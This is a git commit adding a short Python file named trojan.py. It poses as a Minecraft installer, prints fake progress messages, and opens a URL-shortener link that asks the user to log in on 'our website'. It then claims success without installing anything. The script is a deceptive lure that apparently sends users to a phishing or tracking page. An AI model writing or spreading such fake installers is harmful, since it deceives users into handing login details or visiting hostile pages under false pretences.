ea6d935e1fcc2ef8c32b10756edcc2daeed61462
RedytoHari <jonathanjames90419@gmail.com>
2024-06-01 14:15:03 +0530

    Add files via upload

---
+++ trojan.py
@@ -0,0 +1,11 @@
+import time 
+import webbrowser
+
+print('welcome to minecraft installer')
+time.sleep(2)
+print('Login with our website')
+time.sleep(2)
+webbrowser.open("https://2no.co/2hagJ4.link")
+time.sleep(2)
+print("successfully installed")
+time.sleep(20)
